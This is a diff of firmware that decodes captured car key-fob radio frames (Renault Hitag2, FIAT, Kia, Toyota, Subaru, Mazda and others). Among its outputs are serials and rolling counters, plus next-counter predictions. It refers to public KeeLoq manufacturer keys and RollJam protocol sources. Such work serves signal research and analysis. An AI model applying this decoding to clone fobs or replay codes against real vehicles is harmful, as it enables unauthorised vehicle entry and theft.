+      uint32_t ts=v?100U:250U, tl=v?200U:500U, td=v?50U:100U;
+      bool matched=false;
+      if(d+td>=ts&&d<=ts+td){ cells[v][cn[v]++]=(uint8_t)(lv?1:0); matched=true; }
+      else if(d+td>=tl&&d<=tl+td){ cells[v][cn[v]++]=(uint8_t)(lv?1:0);
+                                   cells[v][cn[v]++]=(uint8_t)(lv?1:0); matched=true; }
+      if(!matched){ cn[v]=0; continue; }      // 800µs+ low gap also lands here → run reset
+      if(cn[v]>208){ memmove(cells[v],cells[v]+1,207); cn[v]=208; }
+      if(cn[v]==208){
+        uint8_t raw[13]; memset(raw,0,13);
+        if(ks_fv1_tryWindow(cells[v],false,raw) || (memset(raw,0,13),ks_fv1_tryWindow(cells[v],true,raw))){
+          serial=((uint32_t)raw[2]<<24)|((uint32_t)raw[3]<<16)|((uint32_t)raw[4]<<8)|raw[5];
+          btn=(uint8_t)(raw[6]>>4);
+          ctr=(uint16_t)(((uint32_t)(raw[6]&0x0FU)<<6)|((uint32_t)(raw[7]>>2)));
+          hop=((uint32_t)(raw[7]&0x03U)<<30)|((uint32_t)raw[8]<<22)|((uint32_t)raw[9]<<14)|
+              ((uint32_t)raw[10]<<6)|((uint32_t)(raw[11]>>2));
+          variant=(uint8_t)v;
+          return true;
+        }
+      }
+    }
+  }
+  return false;
+}
+
+// ─── Renault V1 (Hitag2) — 104-bit Manchester frame, ProtoPirate-compatible ───
+// The Renault V1 remote is a Hitag2 transponder scheme: a Manchester-encoded
+// 104-bit frame behind a two-level sync (low 1500µs, high 1000µs), transmitted as
+// three long frames then three 10-bit "short key" frames. TE=125µs, so data
+// pulses are 125µs (short) or 250µs (long). Unlike FIAT V1 the frame carries no
+// simple XOR marker of its own beyond the trailing byte, so validity is the
+// header word (decoded, inverted, must equal 0x0001) plus the byte-XOR of the
+// 11-byte frame. That pairing is what keeps this off other brands.
+//
+// LAYER 1 ONLY — this recovers the wire fields (serial, button, 10-bit counter,
+// 30-bit hop, 2-bit tail). The full 32-bit counter and the Hitag2 epoch/seed are
+// NOT recovered here; that needs the Layer-2 key-recovery search, which the
+// corpus shows does not converge on the 2^18 model used by ProtoPirate (see
+// research/77_RENAULT_HITAG2.md). This decoder is therefore reported as
+// structural (sn/btn/ctr/hop), the same way PSA and Nice are.
+//
+// Manchester engine is the Flipper 4-state machine, so capture polarity is a
+// non-issue: state starts MID1 and both the high and low pulse streams are fed
+// as SHORT/LONG events.
+// Sync windows. The reference accepts a deliberately loose 1150–2200 / 800–1150 µs,
+// but FIAT V1 frames share this Manchester physical layer and contain adjacent long
+// pulses (~1218/845 µs) that fall inside that loose window — a FIAT capture whose
+// own decode fails would then be mislabelled Renault. The real Hitag2 sync is
+// 1500/1000 µs (reference HITAG2_HEADER_LOW/HIGH_US), and the corpus's one genuine
+// Hitag2 recording reads 1574/992. These windows track that nominal pair with room
+// for drift and exclude FIAT's ~1218 µs pulse.
+#define KS_H2_SYNC_LO_MIN 1350U
+#define KS_H2_SYNC_LO_MAX 1850U
+#define KS_H2_SYNC_HI_MIN  870U
+#define KS_H2_SYNC_HI_MAX 1130U
+static const uint8_t ks_h2_tr[4]={0x01,0x91,0x9B,0xFB};   // Flipper manchester transitions
+// pulse fits the Hitag2 sync low (nominal 1500µs)
+static bool ks_h2_hdrLow(uint32_t d){ return d>=KS_H2_SYNC_LO_MIN&&d<=KS_H2_SYNC_LO_MAX; }
+static uint32_t ks_h2_dataThr(uint16_t te){ uint32_t t=(uint32_t)te*3U; if(t<300U)return 150U; if(t>=422U)return 210U; return t/2U; }
+static uint16_t ks_h2_adaptTe(uint16_t te,uint32_t d){ uint32_t m=(uint32_t)te*7U+d; if(m<560U)return 70; if(m>=1488U)return 185; return (uint16_t)(m/8U); }
+static uint8_t ks_h2_frameXor(const uint8_t raw[11]){ uint8_t v=0; for(int i=0;i<10;i++) v^=raw[i]; return v; }
+static void ks_h2_packKey(uint64_t key,uint64_t k2,uint8_t raw[11]){
+  for(int i=0;i<8;i++) raw[i]=(uint8_t)(key>>(8U*(7-i)));
+  raw[8]=(uint8_t)(k2>>16U); raw[9]=(uint8_t)(k2>>8U); raw[10]=(uint8_t)k2;
+}
+static bool ks_h2_accept(KsH2Dec& s,uint32_t& serial,uint8_t& btn,uint16_t& ctr,
+                         uint32_t& hop,uint8_t& tail,uint32_t& key2out){
+  if(s.header!=1U) return false;
+  uint8_t raw[11]; ks_h2_packKey(s.data,s.key2,raw);
+  if(ks_h2_frameXor(raw)!=raw[10]) return false;
+  if(s.valid && s.lastD==s.data && s.lastD2==s.key2) return false;  // suppress repeats
+  serial=(uint32_t)(s.data>>32U);
+  btn=(uint8_t)((raw[4]>>4U)&0x0FU);
+  ctr=(uint16_t)(((uint16_t)(raw[4]&0x0FU)<<6U)|(raw[5]>>2U));
+  hop=((uint32_t)(raw[5]&3U)<<30U)|((uint32_t)raw[6]<<22U)|((uint32_t)raw[7]<<14U)|
+      ((uint32_t)raw[8]<<6U)|(raw[9]>>2U);
+  tail=(uint8_t)(raw[9]&3U);
+  key2out=(uint32_t)s.key2;
+  s.lastD=s.data; s.lastD2=s.key2; s.valid=true;
+  return true;
+}
+static void ks_h2_feed(KsH2Dec& s,bool level,uint32_t duration,
+                       uint32_t& serial,uint8_t& btn,uint16_t& ctr,
+                       uint32_t& hop,uint8_t& tail,uint32_t& key2out,bool& got){
+  for(;;){
+    if(s.step==0){
+      if((!level)&&ks_h2_hdrLow(duration)){ s.te_last=duration; s.step=2; }
+      return;
+    }
+    if(s.step==2){
+      if(level){
+        if(duration<KS_H2_SYNC_HI_MIN||duration>KS_H2_SYNC_HI_MAX||s.te_last<KS_H2_SYNC_LO_MIN||s.te_last>KS_H2_SYNC_LO_MAX){ s.step=0; return; }
+        s.acc=0; s.cnt=0; s.mstate=0; s.te_high=120U; s.te_low=150U; s.step=3; return;
+      }
+      s.step=0; if(ks_h2_hdrLow(duration)){ s.te_last=duration; s.step=2; } return;
+    }
+    if(duration<=49U) return;
+    if(duration>520U){ s.step=0; continue; }
+    uint16_t* te = level? &s.te_high : &s.te_low;
+    int ev;
+    if(duration>ks_h2_dataThr(*te)) ev = level?6:4;             // LongHigh/LongLow
+    else { ev = level?2:0; *te=ks_h2_adaptTe(*te,duration); }    // ShortHigh/ShortLow
+    // Flipper 4-state Manchester: ns==state resets to MID1 with no bit; MID0/MID1
+    // emit a bit; START0/START1 update state silently.
+    int ns=(ks_h2_tr[s.mstate]>>ev)&0x3;
+    bool hasbit=false, bit=false;
+    if(ns==s.mstate){ ns=1; }
+    else if(ns==2){ hasbit=true; bit=false; }
+    else if(ns==1){ hasbit=true; bit=true; }
+    s.mstate=ns;
+    if(!hasbit) return;
+    s.acc=(s.acc<<1U)|(bit?1ULL:0ULL); s.cnt++;
+    if(s.cnt==16U){ s.header=(uint16_t)~s.acc; s.acc=0; return; }
+    if(s.cnt==80U){ s.data=~s.acc; s.acc=0; return; }
+    if(s.cnt==104U){
+      s.key2=(~s.acc)&0xFFFFFFULL;
+      got=ks_h2_accept(s,serial,btn,ctr,hop,tail,key2out);
+      s.acc=0; s.cnt=0; s.step=3;
+    }
+    return;
+  }
+}
+static bool ks_decodeRenaultHitag2(const uint16_t* w,int n,uint32_t& serial,uint8_t& btn,
+                                   uint16_t& ctr,uint32_t& hop,uint8_t& tail,uint32_t& key2){
+  KsH2Dec s; memset(&s,0,sizeof(s));
+  bool got=false; uint32_t k2=0;
+  for(int i=0;i<n;i++){
+    bool lv=((i&1)==0);            // RAW pulses alternate high-first per Flipper .sub
+    uint32_t d=w[i]; if(d>100000U) d=100000U;
+    ks_h2_feed(s,lv,d,serial,btn,ctr,hop,tail,k2,got);
+    if(got) break;
+  }
+  key2=k2; return got;
+}
 // TE_short=250µs, TE_long=500µs. Preamble: ≥4 SHORT+LONG pairs; GAP≈3500µs.
 // Frame (80-bit MSB-first, Manchester-decoded): key1(64-bit) + key2(16-bit).
 // key2[15:8]=key2_hi, key2[7:0]=CRC^0x80.  GF(2) matrix CRC over buf[1..8]+key2_hi.
@@ -6006,7 +7224,7 @@ static bool ks_decodeKiaV7(const char* mb,int ml,
 // ─── KIA/HYU V3/V4 — 68-bit OOK PWM rolling code, KeeLoq (CRC4) ──────────────
 // The one Kia variant FOBworks can actually *decrypt*, because its manufacturer
 // key is public. The same value is the Kia_V3_V4_OEM entry in
-// MFR_KEYS above, and its sources are recorded in `research/01` §2.
+// MFR_KEYS above, and its sources are recorded in §2.
 //
 // IMPORTANT — this must NOT be routed through ks_parseKL. That parser assumes an
 // HCS 66-bit frame with the discriminator at sn[15:4] and the button in the low
@@ -6441,7 +7659,7 @@ static bool ks_decodeKiaV2(const char* mb,int ml,
     // decoder used to fire on, which pass only WITHOUT it. The two sets are disjoint, so
     // this single operator both validates real frames and removes the false positives.
     // Ref: kia_v2.c in the RollJam protocol set of Flipper-ARF, which computes
-    // (crc + 1) & 0x0F. See CITATIONS_AND_REFERENCES.md item 14 and research/39.
+    // (crc + 1) & 0x0F. See CITATIONS_AND_REFERENCES.md item 14
     uint8_t calc=0;
     for(int n=1;n<=12;n++) calc^=(uint8_t)((data>>(n*4))&0x0F);
     if(((calc+1)&0x0F)!=rxc) continue;
@@ -6602,7 +7820,7 @@ static bool ks_decodeBMWCAS4(const char* mb,int ml,uint64_t& frame){
 String decodeSignal(){
   if(rfLen<18){ lastDecode="{\"error\":\"no-signal\",\"edges\":"+String(rfLen)+"}"; return lastDecode; }
 
-  // ── buf / kbuf are static (research/28 §3.1) ─────────────────────────────────
+  // ── buf / kbuf are static ─────────────────────────────────
   //
   // These were two uint32_t[CAP_SZ] arrays on the stack: 2048 B each, 4 KB together, against
   // an 8 KB loopTask stack. With the JsonDocument, ~30 sequential decoder calls and ArduinoJson
@@ -6662,6 +7880,12 @@ String decodeSignal(){
       doc["channel"]=tA?"A":"B";
       doc["mfr"]="Toyota/Lexus (Denso)";
       doc["note"]="OOK PWM rolling code (k-means bypass — equal preamble)";
+      // Intra-capture consensus (N10), same rule as the km-true Toyota commit:
+      // a real press repeats its serial across the burst's frames.
+      { int cAgree=0,cTot=0;
+        ks_consensusVote(rfBuf,rfLen,ks_consToyota,tsn,tbtn,&cAgree,&cTot);
+        char cs[8]; snprintf(cs,8,"%d/%d",cAgree,cTot); doc["consensus"]=cs;
+        if(cTot>=2&&cAgree<2&&cAgree<cTot){ doc["confirmed"]=false; doc["candidate"]=true; } }
       HistEntry he={tsn,0,(uint32_t)tctr,28,mhz,nowMs}; ks_hPush(he);
       int32_t d=ks_estDelta(tsn,28,(uint32_t)tctr);
       JsonObject p=doc["predict"].to<JsonObject>();
@@ -6823,7 +8047,18 @@ String decodeSignal(){
   bool te_hkr =(cA>=260&&cA<=400&&ratio>1.8f&&ratio<2.8f&&bLen>=62);                // Hyundai/Kia early: 312/728µs
   bool te_sfe =(cA>=90 &&cA<=165&&ratio>2.5f&&ratio<3.5f&&bLen>=78);                // Santa Fe 2013-16: 125/375µs
   bool te_kv0 =(cA>=150&&cA<=380&&ratio>=1.7f&&ratio<=2.4f&&bLen>=56);              // KIA V0: 250/500µs PWM, 61-bit
-  bool te_kv1 =(mhz<320.f&&cA>=350&&cA<=700&&ratio>=1.7f&&ratio<=2.3f&&bLen>=50);  // KIA V1: 500/1000µs Manchester
+  // KIA V1: 800/1600µs Manchester (reference kia_v1.c te_short=800 te_long=1600
+  // te_delta=200).  The old 350-700µs window was a 500/1000µs assumption and
+  // excluded the real frames: the on-brand 315 MHz corpus captures cluster at
+  // cA≈807/cB≈1610 (ratio 2.00), i.e. exactly the reference TE, yet landed above
+  // the 700µs ceiling and never reached ks_decodeKiaV1.  Same class of defect as
+  // the te_sub2 cA floor fix (see the v3.60 note above).  cA window 600-1000µs
+  // covers te_short=800 with the reference ±200µs delta; band gate unchanged.
+  bool te_kv1 =(mhz<320.f&&cA>=600&&cA<=1000&&ratio>=1.6f&&ratio<=2.5f&&bLen>=50);  // KIA V1: 800/1600µs Manchester
+  // KIA V1 also needs its long-preamble structure (see ks_kia_v1_preamble): a real
+  // V1 frame is preceded by >140 consecutive 1600µs pulses.  Kept as its own gate
+  // so the discriminator is visible next to te_kv1 rather than buried in the call.
+  bool te_kv1p=ks_kia_v1_preamble(buf,cnt);
   // v3.4 FIX: te_toy restricted to Toyota dual-band frequencies (311.5-315.5 MHz).
   // Without a frequency guard, cA≈400µs KeeLoq fobs at 433 MHz satisfied the TE range
   // and caused ks_decodeToyota to run on KeeLoq frames, labelling them as Toyota-Denso.
@@ -6846,6 +8081,25 @@ String decodeSignal(){
   bool te_kv34 =(cA>=250&&cA<=550&&ratio>=1.6f&&ratio<=2.4f&&bLen>=60);
   // Subaru V2: Manchester OOK ~987 baud, TE_H≈1013µs — ratio≈2.0 (merged bit-boundary half-symbols)
   bool te_sub2 =(cA>=750&&cA<=1300&&ratio>=1.7f&&ratio<=2.3f&&bLen>=30);
+  // PSA (Peugeot/Citroën/DS): FM0/biphase, TE≈225µs, frames 80-200 bits,
+  // 433.075/433.889/433.920 MHz. cA window is wide (150-330) because sweep
+  // noise can drag the k-means short cluster; ks_decodePSA re-derives the
+  // true TE internally and its preamble-train + 1×/2× quantization checks
+  // reject everything else. bLen>=150 excludes all short-frame protocols.
+  // !te_chry: Chrysler Pacifica captures share TE≈220 and FM0-decode cleanly,
+  // but te_chry (cB>=3000) claims them earlier in the chain.
+  bool te_psa  =(eu433&&!te_chry&&cA>=150&&cA<=330&&bLen>=150);
+  // FIAT V1: no TE lock — its two variants (250/500 and 100/200µs) and the corpus's
+  // degraded recordings put cA anywhere from 60 to 250µs, so a width gate would drop
+  // real frames. The frame has to satisfy a 12-byte XOR checksum plus the 0x00/0x01
+  // marker plus a valid button nibble, which carried zero false positives across all
+  // 306 corpus captures, so a length floor is enough of a guard.
+  bool te_fiatv1=(bLen>=60);
+  // Renault V1 (Hitag2): needs the 1500/1000µs two-level sync, so it is gated on
+  // capture length only, exactly like FIAT V1. The frame must show the Hitag2
+  // header word (inverted == 0x0001) AND a valid 11-byte XOR, which is what keeps
+  // it off every other 2:1 Manchester protocol in the corpus.
+  bool te_renv1=(bLen>=104);
   bool decoded=false;
 
   // 1. KeeLoq — cryptographically-gated classification.
@@ -6986,7 +8240,17 @@ String decodeSignal(){
     }
   }
 
-  bool te_kl_skip = (toyotaA && te_toy) || fskCapMode || (toyotaB && te_toy && bLen > 160);
+  // v4.01 FIX — Kia V1 is claimed by te_kl_loose before its own branch runs. The V1
+  // frame carries te_short=800 / te_long=1600 (ratio≈2.0), which sits squarely inside
+  // te_kl_loose's cA 70–1000 / ratio 1.3–2.9 window, so the loose KeeLoq attempt ran
+  // first on the V1 preamble and committed "KeeLoq" with the failure sentinels
+  // sn=0xFFFF/btn=0xF/ctr=0xFFFF. The exact Kia V1 branch 180 lines below never saw it.
+  // The V1-preamble predicate makes this exclusion positive-evidence, not a timing guess,
+  // and it cannot touch a real KeeLoq frame (those have no 140+ pulse 1600µs preamble).
+  // If the V1 Manchester parse still fails, the "KeeLoq with public OEM key" block that
+  // follows the loose attempt covers the frame, exactly intends.
+  bool te_kl_skip = (toyotaA && te_toy) || fskCapMode || (toyotaB && te_toy && bLen > 160)
+                    || (te_kv1 && te_kv1p);
   if((te_kl || te_kl_loose || te_kl_leader) && !te_kl_skip){
     KLFrame f; bool klOK=false;
     static char klb[CAP_SZ/2+1];
@@ -7042,6 +8306,18 @@ String decodeSignal(){
       HistEntry he={f.sn,f.hop,(uint32_t)f.rawCtr,0,mhz,nowMs}; ks_hPush(he);
       ks_krPush(f);
       ks_klRecentPush(f);
+      // Hop-XOR telemetry: expose the key-independent XOR signature against the
+      // previous KeeLoq frame in the ring. Emitted only when there IS a previous
+      // frame, so a first press does not advertise a meaningless zero.
+      if(KL_RECENT_CNT>=2){
+        HopXor hx=ks_hopXorPair(ks_hopRingAt(KL_RECENT_CNT-2), f);
+        char xh[12]; snprintf(xh,12,"0x%08lX",(unsigned long)hx.hop_xor);
+        char xc[12]; snprintf(xc,12,"0x%04lX",(unsigned long)hx.ctr_xor);
+        JsonObject hxo=doc["hop_xor"].to<JsonObject>();
+        hxo["xor"]=xh; hxo["ctr_xor"]=xc; hxo["flip_bits"]=hx.flipBits;
+        hxo["ctr_step1"]=hx.ctrStep1; hxo["same_btn"]=hx.sameBtn;
+        hxo["repeat"]=(hx.hop_xor==0);
+      }
       doc["mfr"]=(pr.found||pr.candidate)?pr.kname:"HCS-series (unknown mfr key)";
       doc["pattern"]=pr.pattern;
       doc["learn"]=ks_klLearnName(pr.learn);
@@ -7101,12 +8377,30 @@ String decodeSignal(){
     uint32_t tsn=0;uint8_t tbtn=0;uint16_t tctr=0;
     const char* tch=toyotaA?"A":toyotaB?"B":"";
     if(ks_decodeToyota(buf,cnt,tsn,tbtn,tctr)){
+      // Intra-capture consensus (N10): re-decode each frame repeat the burst
+      // contains and require the committed serial to appear in at least one more.
+      // A real press repeats its serial in every frame; the Ford/Tesla/VW alias
+      // decodes measured in the corpus triage produce a different serial per
+      // slice, so a solo hit is demoted to candidate rather than committed.
+      int cAgree=0,cTot=0;
+      ks_consensusVote(rfBuf,rfLen,ks_consToyota,tsn,tbtn,&cAgree,&cTot);
+      bool consOK = (cTot<2) || (cAgree>=2) || (cAgree==cTot&&cTot>=2);
       decoded=true;
       doc["proto"]="Toyota-Denso";
       char fh[10];snprintf(fh,10,"0x%06lX",(unsigned long)tsn);
       doc["sn"]=fh;doc["btn"]=tbtn;doc["ctr"]=tctr;
       doc["mfr"]="Toyota/Lexus (Denso)";
       if(tch[0]) doc["channel"]=tch;
+      { char cs[8]; snprintf(cs,8,"%d/%d",cAgree,cTot); doc["consensus"]=cs; }
+      if(!consOK){
+        // Demote: the serial did not repeat across the burst's frames. Keep the
+        // decode for the operator, but mark it unconfirmed exactly like the
+        // KeeLoq single-frame candidate, so the library/dashboard can treat it
+        // the same way.
+        doc["confirmed"]=false;
+        doc["candidate"]=true;
+        doc["confidence"]="unconfirmed";
+      }
       HistEntry he={tsn,0,(uint32_t)tctr,28,mhz,nowMs};ks_hPush(he);
       int32_t d=ks_estDelta(tsn,28,(uint32_t)tctr);
       JsonObject p=doc["predict"].to<JsonObject>();
@@ -7124,9 +8418,9 @@ String decodeSignal(){
   // 1c. Chrysler / Dodge / Jeep (2004-2010) — 80-bit OOK PWM, nibble-interleaved rolling
   if(!decoded&&te_chry){uint8_t cr[10];bool vk=false;if(ks_decodeChrysler(buf,cnt,cr,vk)){decoded=true;doc["proto"]="Chrysler";char fh[24];snprintf(fh,24,"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",cr[0],cr[1],cr[2],cr[3],cr[4],cr[5],cr[6],cr[7],cr[8],cr[9]);doc["frame"]=fh;doc["byte0"]=cr[0];doc["ck_ok"]=vk;doc["mfr"]="Dodge/Jeep/Chrysler";uint32_t sn=((uint32_t)cr[1]<<8)|cr[2];HistEntry he={sn,0,(uint32_t)cr[0],21,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=256;p["note"]="Chrysler 4-bit counter + 8-bit nibble-interleaved rolling";}}
   // 1d. Subaru legacy RKE (~2000-2010) — 48-bit LSB-first PWM, nibble checksum
-  if(!decoded&&te_sub){uint32_t fid=0;uint8_t sc=0,sb=0;bool sv=false;if(ks_decodeSubaru(buf,cnt,fid,sc,sb,sv)){decoded=true;doc["proto"]="Subaru-RKE";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)fid);doc["sn"]=fh;doc["ctr"]=sc;doc["btn"]=sb;doc["ck_ok"]=sv;doc["mfr"]="Subaru";HistEntry he={fid,0,(uint32_t)sc,22,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(fid,22,(uint32_t)sc);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((sc+d)&0xFF);p["window"]=256;p["note"]="Subaru Impreza/Forester/Legacy 8-bit rolling";}}
+  if(!decoded&&te_sub){uint32_t fid=0;uint8_t sc=0,sb=0;bool sv=false;if(ks_decodeSubaru(buf,cnt,fid,sc,sb,sv)){decoded=true;doc["proto"]="Subaru-RKE";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)fid);doc["sn"]=fh;doc["ctr"]=sc;doc["btn"]=sb;doc["ck_ok"]=sv;doc["mfr"]="Subaru";{int cAgree=0,cTot=0;ks_consensusVote(rfBuf,rfLen,ks_consSubaru,fid,sb,&cAgree,&cTot);char cs[8];snprintf(cs,8,"%d/%d",cAgree,cTot);doc["consensus"]=cs;if(cTot>=2&&cAgree<2&&cAgree<cTot){doc["confirmed"]=false;doc["candidate"]=true;}}HistEntry he={fid,0,(uint32_t)sc,22,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(fid,22,(uint32_t)sc);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((sc+d)&0xFF);p["window"]=256;p["note"]="Subaru Impreza/Forester/Legacy 8-bit rolling";}}
   // 1e. Mazda Siemens VDO (~2003-2009) — 72-bit, Siemens proprietary hop + nibble checksum
-  if(!decoded&&te_maz){uint32_t mhp=0,msr=0;uint8_t mc2=0,mb3=0;bool mv=false;if(ks_decodeMazda(buf,cnt,mhp,msr,mc2,mb3,mv)){decoded=true;doc["proto"]="Mazda-Siemens";char fh[10];snprintf(fh,10,"0x%06lX",(unsigned long)msr);doc["sn"]=fh;char hh[12];snprintf(hh,12,"0x%08lX",(unsigned long)mhp);doc["hop"]=hh;doc["ctr"]=mc2;doc["btn"]=mb3;doc["ck_ok"]=mv;doc["mfr"]="Mazda (Siemens VDO)";HistEntry he={msr,mhp,(uint32_t)mc2,23,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(msr,23,(uint32_t)mc2);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((mc2+d)&0xFF);p["window"]=256;p["note"]="Mazda3/6/CX-7 2003-2009 Siemens rolling";}}
+  if(!decoded&&te_maz){uint32_t mhp=0,msr=0;uint8_t mc2=0,mb3=0;bool mv=false;if(ks_decodeMazda(buf,cnt,mhp,msr,mc2,mb3,mv)){decoded=true;doc["proto"]="Mazda-Siemens";char fh[10];snprintf(fh,10,"0x%06lX",(unsigned long)msr);doc["sn"]=fh;char hh[12];snprintf(hh,12,"0x%08lX",(unsigned long)mhp);doc["hop"]=hh;doc["ctr"]=mc2;doc["btn"]=mb3;doc["ck_ok"]=mv;doc["mfr"]="Mazda (Siemens VDO)";{int cAgree=0,cTot=0;ks_consensusVote(rfBuf,rfLen,ks_consMazda,msr,mb3,&cAgree,&cTot);char cs[8];snprintf(cs,8,"%d/%d",cAgree,cTot);doc["consensus"]=cs;if(cTot>=2&&cAgree<2&&cAgree<cTot){doc["confirmed"]=false;doc["candidate"]=true;}}HistEntry he={msr,mhp,(uint32_t)mc2,23,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(msr,23,(uint32_t)mc2);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((mc2+d)&0xFF);p["window"]=256;p["note"]="Mazda3/6/CX-7 2003-2009 Siemens rolling";}}
   // 1f. VAG pre-2004 (VW/Audi/Seat/Skoda) — 64-bit MSB-first, 16-bit rolling, inverted-sum checksum
   if(!decoded&&te_vag){uint32_t vtid=0;uint16_t vctr=0;uint8_t vbtn=0;bool vv=false;if(ks_decodeVAG(buf,cnt,vtid,vctr,vbtn,vv)){decoded=true;doc["proto"]="VAG-pre2004";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)vtid);doc["sn"]=fh;doc["ctr"]=vctr;doc["btn"]=vbtn;doc["ck_ok"]=vv;doc["mfr"]="VW/Audi/Seat/Skoda";HistEntry he={vtid,0,(uint32_t)vctr,24,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(vtid,24,(uint32_t)vctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((vctr+d)&0xFFFF);p["window"]=1024;p["note"]="VW/Audi/Seat/Skoda pre-2004 (ID48 era) 16-bit rolling";}}
   // 1g. Hyundai / Kia RIO early (~2001-2008) — 64-bit fixed-code, ~c checksum
@@ -7137,9 +8431,9 @@ String decodeSignal(){
   // Vehicle protocol, so checked here (ahead of gate decoders) rather than in the Manchester fallback.
   if(!decoded){static char mbA[CAP_SZ/2+1];uint16_t mlA=ks_manchester(bits,bLen,mbA);if(mlA>=64){uint64_t cas4f=0;if(ks_decodeBMWCAS4(mbA,mlA,cas4f)){decoded=true;char fh[20];snprintf(fh,20,"%08lX%08lX",(unsigned long)(cas4f>>32),(unsigned long)(cas4f&0xFFFFFFFFUL));doc["proto"]="BMW-CAS4";doc["frame"]=fh;uint32_t cas4sn=(uint32_t)(cas4f>>32);doc["sn"]=cas4sn;doc["mfr"]="BMW/VW-Touareg (CAS4)";HistEntry he={cas4sn,0,0,27,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="BMW CAS4 64-bit Manchester — crypto not public";}}}
   // 1j. KIA/HYU V0 — 61-bit OOK PWM, CRC8 poly=0x7F, 433 MHz rolling code
-  if(!decoded&&te_kv0){uint32_t kvsn=0;uint16_t kvctr=0;uint8_t kvbtn=0;bool kvv=false;if(ks_decodeKiaV0(buf,cnt,kvsn,kvctr,kvbtn,kvv)){decoded=true;doc["proto"]="KIA-V0";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kvsn);doc["sn"]=fh;doc["ctr"]=kvctr;doc["btn"]=kvbtn;doc["ck_ok"]=kvv;doc["mfr"]="Kia/Hyundai";HistEntry he={kvsn,0,(uint32_t)kvctr,29,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kvsn,29,(uint32_t)kvctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kvctr+(uint16_t)d)&0xFFFF);p["window"]=4096;p["note"]="KIA/HYU V0 61-bit OOK PWM (CRC8 poly=0x7F)";}}
+  if(!decoded&&te_kv0){uint32_t kvsn=0;uint16_t kvctr=0;uint8_t kvbtn=0;bool kvv=false;if(ks_decodeKiaV0(buf,cnt,kvsn,kvctr,kvbtn,kvv)){decoded=true;doc["proto"]="KIA-V0";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kvsn);doc["sn"]=fh;doc["ctr"]=kvctr;doc["btn"]=kvbtn;doc["ck_ok"]=kvv;doc["mfr"]="Kia/Hyundai";{int cAgree=0,cTot=0;ks_consensusVote(rfBuf,rfLen,ks_consKiaV0,kvsn,kvbtn,&cAgree,&cTot);char cs[8];snprintf(cs,8,"%d/%d",cAgree,cTot);doc["consensus"]=cs;if(cTot>=2&&cAgree<2&&cAgree<cTot){doc["confirmed"]=false;doc["candidate"]=true;}}HistEntry he={kvsn,0,(uint32_t)kvctr,29,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kvsn,29,(uint32_t)kvctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kvctr+(uint16_t)d)&0xFFFF);p["window"]=4096;p["note"]="KIA/HYU V0 61-bit OOK PWM (CRC8 poly=0x7F)";}}
   // 1k. KIA/HYU V1 — 57-bit OOK Manchester, CRC4, 315 MHz rolling code
-  if(!decoded&&te_kv1){static char mbV1[CAP_SZ/2+1];uint16_t mlV1=ks_manchester(bits,bLen,mbV1);if(mlV1>=57){uint32_t kvsn=0;uint16_t kvctr=0;uint8_t kvbtn=0;bool kvv=false;if(ks_decodeKiaV1(mbV1,mlV1,kvsn,kvctr,kvbtn,kvv)){decoded=true;doc["proto"]="KIA-V1";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kvsn);doc["sn"]=fh;doc["ctr"]=kvctr;doc["btn"]=kvbtn;doc["ck_ok"]=kvv;doc["mfr"]="Kia/Hyundai";HistEntry he={kvsn,0,(uint32_t)kvctr,30,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kvsn,30,(uint32_t)kvctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kvctr+(uint16_t)d)&0xFFF);p["window"]=4096;p["note"]="KIA/HYU V1 57-bit Manchester (CRC4)";}}}
+  if(!decoded&&te_kv1&&te_kv1p){static char mbV1[CAP_SZ/2+1];uint16_t mlV1=ks_manchester(bits,bLen,mbV1);if(mlV1>=57){uint32_t kvsn=0;uint16_t kvctr=0;uint8_t kvbtn=0;bool kvv=false;if(ks_decodeKiaV1(mbV1,mlV1,kvsn,kvctr,kvbtn,kvv)){decoded=true;doc["proto"]="KIA-V1";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kvsn);doc["sn"]=fh;doc["ctr"]=kvctr;doc["btn"]=kvbtn;doc["ck_ok"]=kvv;doc["mfr"]="Kia/Hyundai";HistEntry he={kvsn,0,(uint32_t)kvctr,30,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kvsn,30,(uint32_t)kvctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kvctr+(uint16_t)d)&0xFFF);p["window"]=4096;p["note"]="KIA/HYU V1 57-bit Manchester (CRC4)";}}}
   // 1l. Ford V0 — 80-bit OOK Manchester, GF(2) CRC, 315/433 MHz
